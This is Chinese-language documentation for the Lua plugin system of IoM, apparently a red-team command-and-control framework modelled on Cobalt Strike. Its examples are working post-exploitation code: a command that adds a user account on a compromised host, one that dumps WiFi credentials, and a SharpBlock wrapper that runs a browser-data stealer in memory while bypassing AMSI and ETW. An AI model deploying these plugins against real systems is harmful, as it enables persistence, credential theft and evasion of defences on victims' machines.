## Intro

IoM 基于lua实现了一套复杂但强大的插件系统。

* 一组类似AggressiveScript的简化api
* 一组全量功能的原始grpc api
* 一系列方便的内置lua库

可以在 [mals插件生态](/IoM/manual/mal/) 中找到相关内容的介绍.

mals插件基于lua实现, 目前lua最好用的ide是vscode, 推荐安装[用户量最多的lua插件](https://marketplace.visualstudio.com/items?itemName=sumneko.lua)


## 基本概念

### lua api

mal lua基于lua 5.1 (https://github.com/yuin/gopher-lua)实现. 

lua 是一门非常简单的脚本语言, 上手难度远远低于python, 也低于aggressive script. 如果尝试使用过python或aggressive scirpt 就可以直接上手lua. 通过AI大模型辅助, 更是可以指挥AI去帮你实现绝大部分功能. 

[lua5.1 reference](https://www.lua.org/manual/5.1/)

[lua5.1 maunal](https://www.lua.org/manual/5.1/manual.html)

*我们在实现基于lua的插件时, 几乎没看过任何lua有关的文档, 相信有任意编程语言的经验都能很快掌握lua.* 

#### mal package

目前mal lua 已经实现了数百个api, 为了更好的管理与分类这些api. 我们将这些api分到三个package中. 

* [builtin](/IoM/manual/mal/builtin/), 直接在当前上下文可用, mal相关核心api
* [rpc](/IoM/manual/mal/rpc/), grpc相关api的lua实现
* [beacon](/IoM/manual/mal/builtin/), 对CobaltStrike的兼容层api. 实现了大量与aggressive scirpt中`b`开头函数等价的api

#### lua 标准库

mal lua中同样支持lua标准库, 相关文档可以查阅 lua5.1文档. 
关于异步/并发的文档可以查阅 https://github.com/yuin/gopher-lua 与 http://godoc.org/github.com/yuin/gopher-lua

* package
* table
* io
* os
* string
* math
* debug
* channel
* coroutine

#### lua 拓展库

为了更方便的使用mal lua, 我们将一些常用工具包都导入到 mal lua中.

当前添加的拓展库

- [argparse](https://github.com/vadv/gopher-lua-libs/tree/master/argparse/) argparse CLI parsing [https://github.com/luarocks/argparse](https://github.com/luarocks/argparse)
- [base64](https://github.com/vadv/gopher-lua-libs/tree/master/base64/) [encoding/base64](https://pkg.go.dev/encoding/base64) api
- [cmd](https://github.com/vadv/gopher-lua-libs/tree/master/cmd/) cmd port
- [db](https://github.com/vadv/gopher-lua-libs/tree/master/db/) access to databases
- [filepath](https://github.com/vadv/gopher-lua-libs/tree/master/filepath/) path.filepath port
- [goos](https://github.com/vadv/gopher-lua-libs/tree/master/goos/) os port
- [humanize](https://github.com/vadv/gopher-lua-libs/tree/master/humanize/) humanize [github.com/dustin/go-humanize](https://github.com/dustin/go-humanize) port
- [inspect](https://github.com/vadv/gopher-lua-libs/tree/master/inspect/) pretty print [github.com/kikito/inspect.lua](https://github.com/kikito/inspect.lua)
- [ioutil](https://github.com/vadv/gopher-lua-libs/tree/master/ioutil/) io/ioutil port
- [json](https://github.com/vadv/gopher-lua-libs/tree/master/json/) json implementation
- [log](https://github.com/vadv/gopher-lua-libs/tree/master/log/) log port
- [plugin](https://github.com/vadv/gopher-lua-libs/tree/master/plugin/) run lua code in lua code
- [regexp](https://github.com/vadv/gopher-lua-libs/tree/master/regexp/) regexp port
- [shellescape](https://github.com/vadv/gopher-lua-libs/tree/master/shellescape/) shellescape [https://github.com/alessio/shellescape](https://github.com/alessio/shellescape) port
- [stats](https://github.com/vadv/gopher-lua-libs/tree/master/stats/) stats [https://github.com/montanaflynn/stats](https://github.com/montanaflynn/stats) port
- [storage](https://github.com/vadv/gopher-lua-libs/tree/master/storage/) package for store persist data and share values between lua states
- [strings](https://github.com/vadv/gopher-lua-libs/tree/master/strings/) strings port (utf supported)
- [tcp](https://github.com/vadv/gopher-lua-libs/tree/master/tcp/) raw tcp client lib
- [template](https://github.com/vadv/gopher-lua-libs/tree/master/template/) template engines
- [time](https://github.com/vadv/gopher-lua-libs/tree/master/time/) time port
- [yaml](https://github.com/vadv/gopher-lua-libs/tree/master/yaml/) [gopkg.in/yaml.v2](https://gopkg.in/yaml.v2) port
- [http](https://github.com/cjoudrey/gluahttp) http
- [crypto](https://github.com/tengattack/gluacrypto)  hash(md5, sha1,sha256, HMAC...), base64, aes 

在lua脚本中, 可以通过 require 引入对应的依赖

```
local crypto = require("crypto")
```

## 基础使用
### Hello World

lua的语法比Aggressive Script的Sleep语言更加简单直观， 在大多数用法下， 就像是简化后的python. 不建议也不需要使用者先去学习lua再开始编写插件， **直接上手即可**。

编写hello.lua

```lua
print("hello world") -- 在client的标准输出中打印hello world

broadcast("hello world") -- 在所有的client中打印hello world

notify("hello world") -- 在所有client中打印, 并且如果配置了第三方通知接口(飞书,tg,微信) 则同时会在向第三方发送通知
```

为了让这个插件能被正确加载, 我们还需要编写 mal.yaml 让IoM可以识别.

```yaml
name: hello
type: lua
author: M09Ic
version: v0.0.1
entry: hello.lua
```

将这两个文件都放在插件的默认保存目录下即可

windows: `%USERPROFILE%/.config/malice/mals/hello/`
linux: `~/.config/malice/mals/hello`

```
mal load hello
```

![](/IoM/assets/Pasted%20image%2020250115001838.png)

!!! important "分发插件"
	[社区仓库](https://github.com/chainreactors/mal-community) 中的插件都通过zip包分发. 

	 也可以将刚刚的`hello.lua` 和 `mal.yaml` 打包成zip, 然后命令安装
	 
	 ```
	 mal install hello.zip 
	```


### register command

通过command函数， 可以将lua的函数注册到IoM client的命令中。

以`net_user_add`与`wifi_dump`的bof为例:

```lua
-- add_net_user
local function run_add_net_user(cmd)
	local username = cmd:Flags():GetString("username") -- 获取username参数
	local password = cmd:Flags():GetString("password") -- 获取password参数
	if username == "" then
		error("username is required")
	end
	if password == "" then
		error("password is required")
	end
	local packed_args = bof_pack("ZZ", username, password)
	local session = active()
	local arch = session.Os.Arch
	if not isadmin(session) then
		error("You need to be an admin to run this command")
	end
	local bof_file = bof_path("add_net_user", arch)
	return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_add_net_user = command("net:user:add", run_add_net_user, "Add a new user account <username> <password>", "T1136.001")
cmd_add_net_user:Flags():String("username", "", "the username to add") -- 注册username参数
cmd_add_net_user:Flags():String("password", "", "the password to set") -- 注册password参数

opsec("net:user:add", 9.0)

-- dump_wifi
local function run_dump_wifi(args, cmd)
	local profilename = ""

	-- Check if using positional arguments first
	if args and #args == 1 and args[1] ~= "" then
		-- Positional argument format: dump_wifi profilename
		profilename = args[1]
	else
		-- Flag format: dump_wifi --profilename profilename
		profilename = cmd:Flags():GetString("profilename")
	end

	if profilename == "" then
		error("profilename is required")
	end

	local packed_args = bof_pack("Z", profilename)
	local session = active()
	local arch = session.Os.Arch
	local bof_file = bof_path("dump_wifi", arch)
	return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_dump_wifi = command("wifi:dump", run_dump_wifi, "Dump WiFi profile credentials <profilename>", "T1555.004")
cmd_dump_wifi:Flags():String("profilename", "", "WiFi profile name to dump")
opsec("wifi:dump", 9.0)

help("dump_wifi", [[
Positional arguments format:
  wifi dump "My WiFi Network"
  wifi dump MyWiFi

Flag format:
  wifi dump --profilename "My WiFi Network"
  wifi dump --profilename MyWiFi
]])
```

需要注意如下几点:

1. `"net:user:add"`中的`:`表示层级以方便命令分组. 在这个例子中表示将会注册一级命令net, 然后注册二级命令user和三级命令add, 因此调用格式为`net user add ...`

2. `run_add_net_user(cmd)`中的`cmd`为内置的command对象同client中的原生command, 因此可以很方便的注册、获取参数，适用于命令的参数多、需要精确控制的场景 , 如：`cmd_add_net_user:Flags():String("username", "", "the username to add")`与`cmd:Flags():GetString("username")`分别用于注册和获取username参数，此命令的tui用法为: `net user add --username <admin_demo> --password <password_demo>`

3. 你可以在`run_dump_wifi`中看到除了`cmd`也另外内置了`args`, `args`是一个table,用于方便参数较少的情况可以类比cs的cna中的语法, 当你在tui终端输入`wifi dump MyWiFi`时 `args`为`{"MyWiFi"}`，那么args[1] (注意lua的索引从1开始)也就对应了`MyWiFi`

当然你也可以让这个命令更加丰富， 让插件更加的。

- `help("net:user:add", "...")` , 添加long helper
- `example("net:user:add", "...")` 添加命令行exmaple
- `opsec("net:user:add", 9.8)` , 添加OPSEC 评分


添加compleler 自动补全,  我们提供了多组场景的自动补全参数

示例:

```lua
...
...

local rem_socks_cmd = command("rem_community:socks5", run_socks5, "serving socks5 with rem", "T1090")

bind_args_completer(rem_socks_cmd, { rem_completer() })
```

## 高级用法

### beacon package

beacon package 是否按照CobaltStrike的aggressive script的api签名封装的一套接口， 用来提供类似aggressive script 编写的体验。 

```lua
local beacon = require("beacon")

beacon.bexecute(active(), "whoami")
```

目前支持的所有aggressive script 风格的api文档请见: https://chainreactors.github.io/wiki/IoM/manual/mal/beacon/

### new protobuf message

在builtin和beacon 包中, 绝大多数api都是高度封装的, 并不需要过多关注底层的GRPC接口调用。

但如果要调用 rpc 包中的接口，就需要手动创建对应的protobuf message.

mals已经将所有的protobuf message都注册到了lua中, 并添加了必要的接口.


```lua
local bin = ExecuteBinary.New()
bin.Name = "execute_assembly"
bin.Args = {"whoami"}
bin.Bin = read_resource("example.exe")
```

或

```lua
local bin = ExecuteBinary.New({
    Name = "execute_assembly",
    Bin = read_resource("example.exe"),
    Type = "example_type",
    Args = {"whoami"}
})
```

### 动态new protobuf message

mals添加了ProtobufMessage 作为通用的反射获取package name的
```lua
local msg = ProtobufMessage.New("modulepb.ExecuteBinary", {
    Name = "execute_assembly",
    Bin = read_resource("example.exe"),
    Type = "example_type",
    Args = {"whoami"}
})
```

### 调用rpc命令
	
```lua
function load_rem()
	 local rpc = require("rpc")

	 local task = rpc.LoadRem(active():Context(), ProtobufMessage.New("modulepb.Request", {
	 	 Name = "load_rem",
	 	 Bin = read_resource("chainreactors/rem.dll"),
	 }))
	 wait(task)
end
```

### 注册为库

mals允许用户自行实现的插件作为类库，成为其他库的依赖。 

只需要将lib设置为ture
```yaml
name: community-lib
type: lua
author: M09Ic
version: v0.0.1
entry: main.lua
lib: true
depend_module: 
```

按照lua lib的写法实现即可在其他库中引用

```lua
local time = require("time")
require("lib.lib")
-- require("modules.noconsolation")
-- require("modules.bofnet")
local lib = {}

function lib.sharpblock(exe_path, exe_args)
    local rpc = require("rpc")
    local session = active()
    local sharpblock_file = "SharpBlock/SharpBlock_Like0x.exe"
    local randomname = random_string(16)
    local fullpipename = "\\\\.\\pipe\\" .. randomname
    local sharpblock_args = {
        "-e", fullpipename, "-s", "c:\\windows\\system32\\notepad.exe",
        "--disable-bypass-cmdline", "--disable-bypass-amsi",
        "--disable-bypass-etw", "-a", ""
    }
    if type(exe_args) == "table" then
        sharpblock_args[#sharpblock_args] = table.concat(exe_args, " ")
    elseif type(exe_args) == "string" then
        sharpblock_args[#sharpblock_args] = exe_args
    end
    print(sharpblock_args)
    print("Pipe Name" .. fullpipename)
    local task = rpc.ExecuteAssembly(session:Context(),
                                     ProtobufMessage.New(
                                         "modulepb.ExecuteBinary", {
            Name = "SharpBlock_Like0x.exe",
            Arch = 1,
            Bin = read_resource(sharpblock_file),
            Type = "execute_assembly",
            Args = sharpblock_args,
            Timeout = 600
        }))
    time.sleep(4)
    local hack_browser_data_content = read(exe_path)
    hack_browser_data_content = base64_encode(hack_browser_data_content)
    print(#hack_browser_data_content)
    pipe_upload_raw(session, fullpipename, hack_browser_data_content)
    for i = 1, 5 do
        time.sleep(0.1)
        pipe_upload_raw(session, fullpipename, "ok")
    end
end

return lib
```

```lua
local clib = require("common-lib")
clib.sharpblock(...,...)
```